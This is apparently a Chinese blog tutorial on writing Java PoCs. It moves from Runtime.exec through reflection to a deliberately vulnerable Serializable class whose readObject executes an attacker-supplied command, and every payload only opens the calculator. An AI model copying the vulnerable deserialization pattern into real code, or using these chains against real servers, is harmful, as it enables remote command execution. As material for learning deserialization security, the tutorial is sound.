---
title: java漏洞POC编写
date: 2021-12-15 13:13:04
categories: Java安全
tags:
- Java漏洞利用
---

> 曲径通幽处，禅房花木深。

java poc编写入门。

本文从最简单的使用Runtime执行命令，再通过反射执行命令，之后又在反序列场景执行命令，最后是反序列化和反射结合执行命令。

<!-- more -->



## 1. 最简单的执行命令

目标：首先明确我们的最终目的是为了执行语句`Runtime.getRuntime().exec("open -a calculator");`

- Runtime.getRuntime：获取一个Runtime的实例
- exec()：调用实例的exec函数
- "open -a calculator": 执行的参数

最简单的弹计算器：

```java
public class ExecRuntimeDemo {
    public static void main(String[] args) throws IOException {
        Runtime.getRuntime().exec("open -a calculator");
    }
}
```





## 2. 反射改造

因为最后是通过反射机制来进行漏洞利用的，

所以先进行反射改造

最简单的反射构造应该是如下：

```java
public class ReflectDemo {
    public static void main(String[] args) throws Exception {
        //1. 获取Runtime的Class对象
        Class runtimeClass = Class.forName("java.lang.Runtime");
        
        //2. 通过Class对象调用exec方法
        Method execMethod = runtimeClass.getMethod("exec", String.class);
        //Runtime runtime = new Runtime(); 不可以，Runtime类是单例模式。每个 Java 应用程序都有一个 
       	//Runtime类实例,通过getRuntime方法获取当前Runtime运行时对象的引用。
        
        //3. 创建一个Runtime对象
        Runtime runtime = Runtime.getRuntime();
        
        
        //4. 在方法对象中传入对象和参数执行方法
        execMethod.invoke(runtime, "open -a calculator");
    }
}
```







## 3. 序列化与反序列化

编写一个存在漏洞的重写了readObject的类

```java
package POCDemo;

import serializable.Serialize;

import java.io.Serializable;

public class VulnClass implements Serializable {
    public String cmd;
    private void readObject(java.io.ObjectInputStream stream) throws Exception {
        stream.defaultReadObject();
        Runtime.getRuntime().exec(cmd);
    }

}

```



客户端构造一个恶意类，传给服务端，服务端在反序列化时调用了重写的readObject方法，导致命令被执行

```java
package POCDemo;

import java.io.*;

public class RuntimeSerializable {
    public static void main(String[] args) throws Exception {
        //客户端写入文件
        VulnClass vulnClass = new VulnClass();
        vulnClass.cmd = "open -a calculator";
        FileOutputStream fileOutputStream = new FileOutputStream("payload.bin");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(vulnClass);


        //服务端读取文件，反序列化，模拟网络传输
        FileInputStream fileInputStream = new FileInputStream("payload.bin");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);

        VulnClass vulnClass1 = (VulnClass) objectInputStream.readObject();

    }

}

```









## 4. 反序列化反射改造1

1. 客户端将payload序列化，传给服务端

2. 服务端将其反序列化，通过反射执行payload

需要说明的是，这里不是完全反射，需要在服务端传入Runtime类。

重写了readObject的漏洞程序：

```java
package POCDemo;

import java.io.Serializable;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class VulnClass implements Serializable {

    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;

    public VulnClass(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }
    private void readObject(java.io.ObjectInputStream stream) throws Exception {
        stream.defaultReadObject();

    }
    public Object vulnInvoke(Object input) throws Exception {
        Class cls = input.getClass();
        Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
        return method.invoke(input, this.iArgs);
    }

}

```



反序列化后通过反射执行

```java
package POCDemo;

import java.io.*;

public class RuntimeSerializable {
    public static void main(String[] args) throws Exception {
        //客户端写入文件
        VulnClass vulnClass = new VulnClass(
                "Runtime.class",
                new Class[]{String.class},
                new Object[]{"open -a calculator"}
        );
        FileOutputStream fileOutputStream = new FileOutputStream("payload.bin");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(vulnClass);


        //服务端读取文件，反序列化，模拟网络传输
        FileInputStream fileInputStream = new FileInputStream("payload.bin");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);

        VulnClass vulnClass1 = (VulnClass) objectInputStream.readObject();

        Runtime runtime = Runtime.getRuntime();
        vulnClass1.vulnInvoke(runtime);
    }

}

```



## 5. 反序列化反射改造2

我们要进行完全反射的话，不能在服务端创建Runtime对象，那么我们需要反射出服务端的Runtime实例对象。

反射实例对象

```java
Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))
```

那么完整payload就如下

```java
package POCDemo;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Calendar;

public class ReflectDemo {
    public static void main(String[] args) throws Exception {
        Class runtimeClass = Class.forName("java.lang.Runtime");
        Method runtimeMethod = runtimeClass.getMethod("exec", String.class);
        runtimeMethod.invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),"open -a calculator");
    }
}
```

这里需要知道getMethod("getRuntime")是因为java.lang.Runtime是单例模式，只能通过getRuntime方法获取对象。



将上诉poc改成一句就为

```java
package POCDemo;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Calendar;

public class ReflectDemo {
    public static void main(String[] args) throws Exception {
        Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),"open -a calculator");
    }
}

```





## 6. 总结

本文从最简单的使用Runtime执行命令，再通过反射执行命令，之后又在反序列场景执行命令，最后是反序列化和反射结合执行命令。
